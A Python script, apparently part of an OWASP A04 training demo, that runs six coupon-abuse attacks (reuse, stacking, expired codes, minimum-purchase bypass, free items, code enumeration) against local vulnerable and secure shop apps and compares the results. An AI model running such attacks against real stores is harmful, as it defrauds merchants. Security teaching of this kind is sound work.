#!/usr/bin/env python3
"""
OWASP A04:2021 - Coupon Abuse Attack Script
============================================
測試優惠券業務邏輯漏洞

CWE-840: Business Logic Errors
CWE-841: Improper Enforcement of Behavioral Workflow

Author: OWASP Demo
"""

import requests
import argparse
import json

# ANSI Colors
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
RESET = '\033[0m'

VULNERABLE_URL = "http://localhost:8081"
SECURE_URL = "http://localhost:8082"


def print_banner():
    print(f"""
{RED}╔═══════════════════════════════════════════════════════════════════════════╗
║   ██████╗ ██████╗ ██╗   ██╗██████╗  ██████╗ ███╗   ██╗                     ║
║  ██╔════╝██╔═══██╗██║   ██║██╔══██╗██╔═══██╗████╗  ██║                     ║
║  ██║     ██║   ██║██║   ██║██████╔╝██║   ██║██╔██╗ ██║                     ║
║  ██║     ██║   ██║██║   ██║██╔═══╝ ██║   ██║██║╚██╗██║                     ║
║  ╚██████╗╚██████╔╝╚██████╔╝██║     ╚██████╔╝██║ ╚████║                     ║
║   ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝      ╚═════╝ ╚═╝  ╚═══╝                     ║
║   █████╗ ██████╗ ██╗   ██╗███████╗███████╗                                 ║
║  ██╔══██╗██╔══██╗██║   ██║██╔════╝██╔════╝                                 ║
║  ███████║██████╔╝██║   ██║███████╗█████╗                                   ║
║  ██╔══██║██╔══██╗██║   ██║╚════██║██╔══╝                                   ║
║  ██║  ██║██████╔╝╚██████╔╝███████║███████╗                                 ║
║  ╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚══════╝╚══════╝                                 ║
║                                                                             ║
║  OWASP A04:2021 - Coupon Abuse Attack Script                               ║
║  CWE-840: Business Logic Errors                                             ║
╚═══════════════════════════════════════════════════════════════════════════╝{RESET}
""")


def clear_cart(base_url, user_id=1):
    """清空購物車"""
    try:
        requests.post(f"{base_url}/api/coupons/clear", params={"userId": user_id}, timeout=5)
    except:
        pass


def attack_multiple_usage(base_url):
    """多次使用同一優惠券"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[1] Multiple Usage Attack - 同一優惠券多次使用{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"\n目標端點: {base_url}/api/coupons/apply")
    print(f"攻擊原理: 無使用限制檢查，允許同一優惠券多次使用")
    
    coupon_code = "SAVE10"
    user_id = 1
    cart_total = 100.00
    
    clear_cart(base_url, user_id)
    
    print(f"\n[*] 優惠券: {coupon_code}")
    print(f"[*] 原價: ${cart_total}")
    
    usage_count = 0
    final_discount = 0
    
    for i in range(5):
        try:
            response = requests.post(
                f"{base_url}/api/coupons/apply",
                params={
                    "code": coupon_code,
                    "userId": user_id,
                    "cartTotal": cart_total
                },
                timeout=5
            )
            
            if response.status_code == 200:
                data = response.json()
                usage_count += 1
                discount = data.get("discount", 0)
                final_total = data.get("finalTotal", cart_total)
                final_discount = cart_total - final_total
                
                print(f"    使用 {i+1}: 成功 - 折扣 ${discount}, 最終價格 ${final_total}")
            else:
                print(f"    使用 {i+1}: 失敗 - {response.json().get('error', 'Unknown error')}")
                break
                
        except Exception as e:
            print(f"    使用 {i+1}: 錯誤 - {e}")
    
    print(f"\n[*] 成功使用次數: {usage_count}")
    print(f"[*] 總折扣: ${final_discount}")
    
    if usage_count > 1:
        print(f"\n{RED}[VULNERABLE] 同一優惠券可多次使用！{RESET}")
        return True
    else:
        print(f"\n{GREEN}[PROTECTED] 單次使用限制生效{RESET}")
        return False


def attack_unlimited_stacking(base_url):
    """無限疊加優惠券"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[2] Unlimited Stacking Attack - 無限疊加優惠券{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"\n目標端點: {base_url}/api/coupons/apply")
    print(f"攻擊原理: 無疊加限制，可使用多張優惠券")
    
    # 可疊加的優惠券
    coupons = ["STACK100", "SAVE10", "VIP90OFF", "UNLIMITED"]
    user_id = 2
    cart_total = 500.00
    
    clear_cart(base_url, user_id)
    
    print(f"\n[*] 原價: ${cart_total}")
    print(f"[*] 嘗試疊加優惠券: {coupons}")
    
    applied_count = 0
    current_total = cart_total
    total_discount = 0
    
    for code in coupons:
        try:
            response = requests.post(
                f"{base_url}/api/coupons/apply",
                params={
                    "code": code,
                    "userId": user_id,
                    "cartTotal": cart_total
                },
                timeout=5
            )
            
            if response.status_code == 200:
                data = response.json()
                applied_count += 1
                discount = data.get("discount", 0)
                current_total = data.get("finalTotal", current_total)
                total_discount = cart_total - current_total
                
                print(f"    {code}: 成功 - 折扣 ${discount}, 當前總價 ${current_total}")
            else:
                error = response.json().get("error", "Unknown error")
                print(f"    {code}: 失敗 - {error}")
                
        except Exception as e:
            print(f"    {code}: 錯誤 - {e}")
    
    print(f"\n[*] 成功疊加: {applied_count} 張優惠券")
    print(f"[*] 總折扣: ${total_discount}")
    print(f"[*] 最終價格: ${current_total}")
    
    if applied_count > 2:
        print(f"\n{RED}[VULNERABLE] 可疊加超過限制的優惠券！{RESET}")
        return True
    elif applied_count > 1:
        print(f"\n{YELLOW}[PARTIAL] 允許有限疊加{RESET}")
        return False
    else:
        print(f"\n{GREEN}[PROTECTED] 疊加限制生效{RESET}")
        return False


def attack_expired_coupon(base_url):
    """使用過期優惠券"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[3] Expired Coupon Attack - 使用過期優惠券{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"\n目標端點: {base_url}/api/coupons/apply")
    print(f"攻擊原理: 無過期檢查，允許使用過期優惠券")
    
    expired_code = "EXPIRED50"  # 過期的優惠券
    user_id = 3
    cart_total = 200.00
    
    clear_cart(base_url, user_id)
    
    print(f"\n[*] 過期優惠券: {expired_code}")
    print(f"[*] 購物車金額: ${cart_total}")
    
    try:
        response = requests.post(
            f"{base_url}/api/coupons/apply",
            params={
                "code": expired_code,
                "userId": user_id,
                "cartTotal": cart_total
            },
            timeout=5
        )
        
        print(f"\n[*] 響應狀態: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            discount = data.get("discount", 0)
            final_total = data.get("finalTotal", cart_total)
            
            print(f"    折扣: ${discount}")
            print(f"    最終價格: ${final_total}")
            
            if discount > 0:
                print(f"\n{RED}[VULNERABLE] 過期優惠券仍可使用！{RESET}")
                return True
            else:
                print(f"\n{GREEN}[PROTECTED] 過期優惠券無效{RESET}")
                return False
        else:
            error = response.json().get("error", "Unknown error")
            print(f"    錯誤: {error}")
            print(f"\n{GREEN}[PROTECTED] 過期優惠券被拒絕{RESET}")
            return False
            
    except Exception as e:
        print(f"    [ERROR] {e}")
        return False


def attack_minimum_purchase_bypass(base_url):
    """繞過最低消費限制"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[4] Minimum Purchase Bypass - 繞過最低消費{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"\n目標端點: {base_url}/api/coupons/apply")
    print(f"攻擊原理: 無最低消費驗證")
    
    # BIGSPENDER: 需要 $500 最低消費
    coupon_code = "BIGSPENDER"
    user_id = 4
    cart_total = 50.00  # 遠低於最低消費
    
    clear_cart(base_url, user_id)
    
    print(f"\n[*] 優惠券: {coupon_code} (需最低消費 $500)")
    print(f"[*] 購物車金額: ${cart_total}")
    
    try:
        response = requests.post(
            f"{base_url}/api/coupons/apply",
            params={
                "code": coupon_code,
                "userId": user_id,
                "cartTotal": cart_total
            },
            timeout=5
        )
        
        print(f"\n[*] 響應狀態: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            discount = data.get("discount", 0)
            
            if discount > 0:
                print(f"    折扣: ${discount}")
                print(f"\n{RED}[VULNERABLE] 最低消費檢查被繞過！{RESET}")
                return True
            else:
                print(f"\n{GREEN}[PROTECTED] 最低消費檢查生效{RESET}")
                return False
        else:
            error = response.json().get("error", "Unknown error")
            print(f"    錯誤: {error}")
            print(f"\n{GREEN}[PROTECTED] 最低消費限制生效{RESET}")
            return False
            
    except Exception as e:
        print(f"    [ERROR] {e}")
        return False


def attack_free_item_abuse(base_url):
    """免費商品濫用"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[5] Free Item Abuse - 免費商品濫用{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"\n目標端點: {base_url}/api/coupons/apply")
    print(f"攻擊原理: 100% 折扣優惠券無最大折扣限制")
    
    # FREE100: 100% 折扣，無最大限制
    coupon_code = "FREE100"
    cart_total = 10000.00  # 高價商品
    
    clear_cart(base_url, 5)
    
    print(f"\n[*] 優惠券: {coupon_code} (100% 折扣)")
    print(f"[*] 購物車金額: ${cart_total}")
    
    try:
        response = requests.post(
            f"{base_url}/api/coupons/apply",
            params={
                "code": coupon_code,
                "userId": 5,
                "cartTotal": cart_total
            },
            timeout=5
        )
        
        print(f"\n[*] 響應狀態: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            discount = data.get("discount", 0)
            final_total = data.get("finalTotal", cart_total)
            
            print(f"    折扣: ${discount}")
            print(f"    最終價格: ${final_total}")
            
            if final_total <= 0 or discount >= cart_total:
                print(f"\n{RED}[VULNERABLE] 可免費獲取高價商品！{RESET}")
                return True
            else:
                print(f"\n{GREEN}[PROTECTED] 最大折扣限制生效{RESET}")
                return False
        else:
            error = response.json().get("error", "Unknown error")
            print(f"    錯誤: {error}")
            return False
            
    except Exception as e:
        print(f"    [ERROR] {e}")
        return False


def attack_coupon_enumeration(base_url):
    """優惠券枚舉"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}[6] Coupon Enumeration - 優惠券枚舉{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"\n目標端點: {base_url}/api/coupons/available")
    print(f"攻擊原理: 暴露所有可用優惠券代碼")
    
    try:
        response = requests.get(f"{base_url}/api/coupons/available", timeout=5)
        
        print(f"\n[*] 響應狀態: {response.status_code}")
        
        if response.status_code == 200:
            coupons = response.json()
            
            if isinstance(coupons, list) and len(coupons) > 0:
                print(f"\n[*] 發現 {len(coupons)} 張優惠券:")
                
                for coupon in coupons:
                    if isinstance(coupon, dict):
                        code = coupon.get("code", "N/A")
                        discount = coupon.get("discountValue", "N/A")
                        discount_type = coupon.get("discountType", "N/A")
                        print(f"    - {code}: {discount} ({discount_type})")
                
                print(f"\n{RED}[VULNERABLE] 所有優惠券代碼被暴露！{RESET}")
                return True
            else:
                print(f"\n{GREEN}[PROTECTED] 優惠券列表受保護{RESET}")
                return False
        else:
            print(f"\n{GREEN}[PROTECTED] 優惠券列表端點受保護{RESET}")
            return False
            
    except Exception as e:
        print(f"    [ERROR] {e}")
        return False


def compare_vulnerability():
    """比較漏洞版本與安全版本"""
    print(f"\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}比較漏洞版本 vs 安全版本{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    
    tests = [
        ("多次使用", attack_multiple_usage),
        ("無限疊加", attack_unlimited_stacking),
        ("過期優惠券", attack_expired_coupon),
        ("最低消費繞過", attack_minimum_purchase_bypass),
        ("優惠券枚舉", attack_coupon_enumeration),
    ]
    
    results = {
        "漏洞版本": {},
        "安全版本": {}
    }
    
    for test_name, test_func in tests:
        print(f"\n\n{YELLOW}========== 測試: {test_name} =========={RESET}")
        
        print(f"\n{BLUE}--- 漏洞版本 ---{RESET}")
        vuln_result = test_func(VULNERABLE_URL)
        results["漏洞版本"][test_name] = vuln_result
        
        print(f"\n{BLUE}--- 安全版本 ---{RESET}")
        secure_result = test_func(SECURE_URL)
        results["安全版本"][test_name] = secure_result
    
    # 摘要
    print(f"\n\n{CYAN}{'='*70}{RESET}")
    print(f"{CYAN}結果摘要{RESET}")
    print(f"{CYAN}{'='*70}{RESET}")
    print(f"\n{'測試項目':<20} {'漏洞版本':<15} {'安全版本':<15}")
    print("-" * 50)
    
    for test_name, _ in tests:
        vuln_status = f"{RED}VULNERABLE{RESET}" if results["漏洞版本"].get(test_name) else f"{GREEN}OK{RESET}"
        secure_status = f"{RED}VULNERABLE{RESET}" if results["安全版本"].get(test_name) else f"{GREEN}PROTECTED{RESET}"
        print(f"{test_name:<20} {vuln_status:<25} {secure_status:<25}")


def main():
    parser = argparse.ArgumentParser(
        description="Coupon Abuse Attack Script for OWASP A04 Demo",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 coupon_abuse.py --multiple      # 多次使用攻擊
  python3 coupon_abuse.py --stack         # 無限疊加攻擊
  python3 coupon_abuse.py --expired       # 過期優惠券攻擊
  python3 coupon_abuse.py --minimum       # 最低消費繞過
  python3 coupon_abuse.py --free          # 免費商品濫用
  python3 coupon_abuse.py --enum          # 優惠券枚舉
  python3 coupon_abuse.py --all           # 所有攻擊
  python3 coupon_abuse.py --compare       # 比較版本
        """
    )
    
    parser.add_argument("--multiple", action="store_true", help="多次使用攻擊")
    parser.add_argument("--stack", action="store_true", help="無限疊加攻擊")
    parser.add_argument("--expired", action="store_true", help="過期優惠券攻擊")
    parser.add_argument("--minimum", action="store_true", help="最低消費繞過")
    parser.add_argument("--free", action="store_true", help="免費商品濫用")
    parser.add_argument("--enum", action="store_true", help="優惠券枚舉")
    parser.add_argument("--all", action="store_true", help="所有攻擊")
    parser.add_argument("--compare", action="store_true", help="比較版本")
    parser.add_argument("--url", default=VULNERABLE_URL, help="目標 URL")
    
    args = parser.parse_args()
    
    print_banner()
    
    if args.compare:
        compare_vulnerability()
    elif args.all:
        attack_multiple_usage(args.url)
        attack_unlimited_stacking(args.url)
        attack_expired_coupon(args.url)
        attack_minimum_purchase_bypass(args.url)
        attack_free_item_abuse(args.url)
        attack_coupon_enumeration(args.url)
    else:
        if args.multiple:
            attack_multiple_usage(args.url)
        if args.stack:
            attack_unlimited_stacking(args.url)
        if args.expired:
            attack_expired_coupon(args.url)
        if args.minimum:
            attack_minimum_purchase_bypass(args.url)
        if args.free:
            attack_free_item_abuse(args.url)
        if args.enum:
            attack_coupon_enumeration(args.url)
        
        if not any([args.multiple, args.stack, args.expired, args.minimum, args.free, args.enum]):
            attack_multiple_usage(args.url)
    
    print(f"\n{BLUE}[*] Coupon Abuse 攻擊展示完成{RESET}")


if __name__ == "__main__":
    main()
